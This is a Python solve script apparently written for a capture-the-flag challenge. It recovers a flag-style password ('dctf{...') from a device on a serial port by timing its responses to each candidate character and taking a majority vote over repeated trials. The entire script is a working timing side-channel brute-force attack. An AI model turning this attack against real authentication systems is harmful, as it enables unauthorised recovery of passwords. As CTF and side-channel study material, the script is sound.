import serial
from time import perf_counter, sleep
from collections import Counter

# This script may be improved, since at longer matches the char AFTER the correct one has a very long delay too.
# However, it is 6AM and I have not slept.
repeats = 5
plen = 42
known_password = list('dctf{')
L = len(known_password)

ser = serial.Serial('COM9', timeout=5)

def recv_until(s, marker):
    buf = b''
    while not buf.endswith(marker):
        b = s.read(1)
        if not b:
            raise TimeoutError(f"Timed out waiting for {marker!r}, got {buf!r}")
        buf += b
    return buf

def max_freq(arr):
    counts = Counter(arr)
    print(counts)
    for val, cnt in counts.items():
        if cnt > len(arr) // 2:
            return val
    raise Exception(f'Could not decide on best c from {arr}')

password = ['A']*plen
password[:L] = known_password
recv_until(ser, b':')
input("Say when!")
for i in range(L, plen):
    best_c = None
    best_dt = 0
    arr = []
    for j in range(repeats):
        for c in range(32, 128):
            password[i] = chr(c)
            ser.write(''.join(password).encode())
            tick = perf_counter()
            recv_until(ser, b':')
            tock = perf_counter()
            dt = tock - tick
            
            print(f"  c={chr(c)} ({c}): {dt*1000:.3f} ms")
            if dt > best_dt and c != 32:
                best_dt = dt
                best_c = chr(c)
        print(f"Best: {best_c}")
        arr.append(best_c)
    best = max_freq(arr)
    password[i] = best
    print(f"[+] pos {i}: '{best}' -> password so far: '{''.join(password[:i+1])}'")
